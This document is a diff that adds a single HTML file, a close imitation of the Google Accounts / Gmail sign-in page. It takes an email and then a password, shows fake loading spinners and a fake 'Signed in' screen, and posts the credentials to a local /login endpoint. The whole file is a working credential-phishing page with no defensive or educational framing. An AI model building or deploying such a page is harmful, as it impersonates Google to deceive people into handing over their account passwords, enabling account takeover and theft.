@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg">
+    <style>
+        /* --- GOOGLE MATERIAL DESIGN 3 (2025) --- */
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Roboto', arial, sans-serif;
+            background-color: #f0f4f9; /* Desktop Color */
+            color: #1f1f1f;
+            display: flex; flex-direction: column;
+            min-height: 100vh; align-items: center; justify-content: center;
+        }
+
+        /* --- CARD STYLE --- */
+        .main-wrapper {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            width: 100%; padding: 24px; flex-grow: 1;
+        }
+
+        .card {
+            background-color: #fff;
+            border-radius: 28px; /* New Rounded Corners */
+            padding: 36px;
+            width: 100%; max-width: 400px;
+            min-height: 400px;
+            display: flex; flex-direction: column;
+            transition: height 0.3s;
+        }
+
+        @media (min-width: 601px) {
+            .card { padding: 48px 40px 36px; height: auto; }
+        }
+
+        /* --- LOGO --- */
+        .google-logo { height: 24px; margin-bottom: 16px; align-self: flex-start; }
+
+        /* --- TEXT --- */
+        .heading { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #1f1f1f; }
+        .sub-heading { font-size: 16px; margin-bottom: 35px; color: #1f1f1f; }
+
+        /* --- INPUTS --- */
+        .input-container { position: relative; margin-bottom: 10px; width: 100%; }
+        
+        .input-field {
+            width: 100%; height: 56px; padding: 13px 15px; font-size: 16px;
+            border: 1px solid #747775; border-radius: 4px;
+            background-color: transparent; color: #1f1f1f; outline: none;
+            z-index: 1; position: relative;
+        }
+        .input-field:focus { border: 2px solid #0b57d0; padding: 12px 14px; }
+        
+        /* Floating Label Logic */
+        .input-label {
+            position: absolute; left: 12px; top: 16px; padding: 0 4px;
+            background-color: #fff; color: #747775; font-size: 16px;
+            transition: 0.2s; pointer-events: none; z-index: 2;
+        }
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            top: -9px; font-size: 12px; color: #0b57d0; font-weight: 500;
+        }
+
+        /* --- USER CHIP (For Step 2) --- */
+        .user-chip {
+            border: 1px solid #747775; border-radius: 18px; padding: 4px 12px 4px 4px;
+            display: inline-flex; align-items: center; margin-bottom: 30px; cursor: pointer;
+            font-size: 14px; color: #1f1f1f; font-weight: 500;
+        }
+        .profile-icon {
+            width: 24px; height: 24px; border-radius: 50%; background-color: #0b57d0; color: #fff;
+            display: flex; align-items: center; justify-content: center; font-size: 14px; margin-right: 8px;
+        }
+        .dropdown-arrow { margin-left: 8px; font-size: 12px; }
+
+        /* --- BUTTONS --- */
+        .actions {
+            display: flex; justify-content: space-between; align-items: center; margin-top: 50px;
+        }
+        .create-btn { color: #0b57d0; font-size: 14px; font-weight: 500; background: none; border: none; cursor: pointer; }
+        .next-btn {
+            background-color: #0b57d0; color: white; border: none;
+            padding: 10px 24px; border-radius: 20px; font-size: 14px; font-weight: 500;
+            cursor: pointer; min-width: 80px; min-height: 40px; position: relative;
+        }
+        .next-btn:hover { background-color: #0a46a5; box-shadow: 0 1px 2px rgba(0,0,0,0.3); }
+
+        /* --- SPINNER --- */
+        .spinner {
+            display: none; width: 20px; height: 20px; border: 2px solid #fff; border-top-color: transparent;
+            border-radius: 50%; animation: spin 1s linear infinite;
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        }
+        @keyframes spin { to { transform: translate(-50%, -50%) rotate(360deg); } }
+
+        /* --- SECTIONS (Steps) --- */
+        #step2, #successView { display: none; }
+        
+        /* Checkbox */
+        .checkbox-container { display: flex; align-items: center; margin-top: 10px; }
+        .show-pass { margin-right: 10px; width: 18px; height: 18px; accent-color: #0b57d0; }
+        .show-label { font-size: 14px; color: #1f1f1f; }
+
+        /* Error */
+        .error-msg { color: #d93025; font-size: 12px; margin-top: 6px; display: none; align-items: center; }
+
+        /* --- FOOTER --- */
+        footer { width: 100%; max-width: 400px; padding: 16px 0; display: flex; justify-content: space-between; font-size: 12px; color: #444746; }
+        @media (min-width: 601px) { footer { max-width: 100%; padding: 24px 40px; } }
+        .footer-links a { color: #444746; text-decoration: none; margin-left: 16px; }
+
+        /* --- MOBILE TWEAKS --- */
+        @media (max-width: 600px) {
+            body { background-color: #fff; justify-content: flex-start; }
+            .main-wrapper { padding: 0; align-items: flex-start; }
+            .card { padding: 16px 24px; border-radius: 0; max-width: 100%; box-shadow: none; }
+            footer { background: #f0f4f9; padding: 20px 24px; margin-top: auto; }
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const successView = document.getElementById('successView');
+            const form = document.getElementById('loginForm');
+            
+            // Inputs
+            const emailInput = document.getElementById('email');
+            const passInput = document.getElementById('password');
+            const userEmailDisplay = document.getElementById('userEmailDisplay');
+            const profileInitial = document.getElementById('profileInitial');
+            
+            // Buttons
+            const btn1 = document.getElementById('btnStep1');
+            const btn2 = document.getElementById('btnStep2');
+            const spinner1 = document.getElementById('spinner1');
+            const spinner2 = document.getElementById('spinner2');
+            const text1 = document.getElementById('text1');
+            const text2 = document.getElementById('text2');
+            
+            // Errors
+            const error1 = document.getElementById('error1');
+
+            // --- STEP 1 LOGIC (Email) ---
+            btn1.addEventListener('click', function() {
+                // Validation
+                if (!emailInput.value) {
+                    emailInput.style.borderColor = '#d93025';
+                    error1.style.display = 'flex';
+                    emailInput.focus();
+                    return;
+                }
+
+                // Loading Animation
+                btn1.disabled = true;
+                text1.style.display = 'none';
+                spinner1.style.display = 'block';
+
+                // Fake Network Delay (1 sec) -> Go to Step 2
+                setTimeout(() => {
+                    step1.style.display = 'none';
+                    step2.style.display = 'flex';
+                    step2.style.flexDirection = 'column';
+                    
+                    // Update Chip with Email
+                    userEmailDisplay.textContent = emailInput.value;
+                    profileInitial.textContent = emailInput.value.charAt(0).toUpperCase();
+                    
+                    // Reset Button 1
+                    btn1.disabled = false;
+                    text1.style.display = 'block';
+                    spinner1.style.display = 'none';
+                }, 1000);
+            });
+
+            // Reset Error on input
+            emailInput.addEventListener('input', function() {
+                this.style.borderColor = '#0b57d0';
+                error1.style.display = 'none';
+            });
+
+            // --- STEP 2 LOGIC (Password & Submit) ---
+            btn2.addEventListener('click', function(e) {
+                e.preventDefault(); // Default submit roko
+                
+                if(!passInput.value) {
+                    passInput.focus();
+                    passInput.style.borderColor = '#d93025';
+                    return;
+                }
+
+                // Loading Animation
+                btn2.disabled = true;
+                text2.style.display = 'none';
+                spinner2.style.display = 'block';
+
+                // Fake Delay -> Success -> Submit
+                setTimeout(() => {
+                    step2.style.display = 'none';
+                    successView.style.display = 'flex';
+                    successView.style.flexDirection = 'column';
+                    successView.style.alignItems = 'center';
+
+                    // FINAL DATA SENDING
+                    setTimeout(() => {
+                        form.submit(); // Send data to /login
+                    }, 2000);
+
+                }, 1500);
+            });
+            
+            passInput.addEventListener('input', function() {
+                 this.style.borderColor = '#0b57d0';
+            });
+        });
+    </script>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <div class="card">
+            
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="google-logo">
+
+            <form id="loginForm" action="/login" method="POST">
+                
+                <div id="step1">
+                    <h1 class="heading">Sign in</h1>
+                    <h2 class="sub-heading">to continue to Gmail</h2>
+
+                    <div class="input-container">
+                        <input type="text" id="email" name="username" class="input-field" placeholder=" " autocomplete="off">
+                        <label for="email" class="input-label">Email or phone</label>
+                        <div id="error1" class="error-msg">! Enter an email or phone number</div>
+                    </div>
+
+                    <a href="#" style="color:#0b57d0; font-size:14px; font-weight:500; text-decoration:none; margin-top:5px; display:inline-block;">Forgot email?</a>
+
+                    <div style="font-size:14px; color:#444746; margin-top:40px; line-height:1.5;">
+                        Not your computer? Use Guest mode to sign in privately. <br>
+                        <a href="#" style="color:#0b57d0; text-decoration:none; font-weight:500;">Learn more</a>
+                    </div>
+
+                    <div class="actions">
+                        <button type="button" class="create-btn">Create account</button>
+                        <button type="button" id="btnStep1" class="next-btn">
+                            <span id="text1">Next</span>
+                            <div id="spinner1" class="spinner"></div>
+                        </button>
+                    </div>
+                </div>
+
+                <div id="step2">
+                    <h1 class="heading">Welcome</h1>
+                    
+                    <div class="user-chip">
+                        <div class="profile-icon" id="profileInitial">U</div>
+                        <span id="userEmailDisplay">user@example.com</span>
+                        <span class="dropdown-arrow">▼</span>
+                    </div>
+
+                    <div class="input-container">
+                        <input type="password" id="password" name="password" class="input-field" placeholder=" ">
+                        <label for="password" class="input-label">Enter your password</label>
+                    </div>
+
+                    <div class="checkbox-container">
+                        <input type="checkbox" class="show-pass">
+                        <span class="show-label">Show password</span>
+                    </div>
+
+                    <div class="actions">
+                        <a href="#" style="color:#0b57d0; font-size:14px; font-weight:500; text-decoration:none;">Forgot password?</a>
+                        <button type="button" id="btnStep2" class="next-btn">
+                            <span id="text2">Next</span>
+                            <div id="spinner2" class="spinner"></div>
+                        </button>
+                    </div>
+                </div>
+
+                <div id="successView">
+                    <div style="width:60px; height:60px; border-radius:50%; background:#e8f0fe; display:flex; align-items:center; justify-content:center; margin-bottom:20px;">
+                        <span style="font-size:32px; color:#0b57d0;">✓</span>
+                    </div>
+                    <h2 class="heading">Signed in</h2>
+                    <p style="color:#5f6368; margin-top:10px;">Redirecting...</p>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-left">
+            <select style="background:transparent; border:none; color:#444746; font-size:12px;">
+                <option>English (United Kingdom)</option>
+                <option>Hindi</option>
+            </select>
+        </div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+
+</body>
+</html>
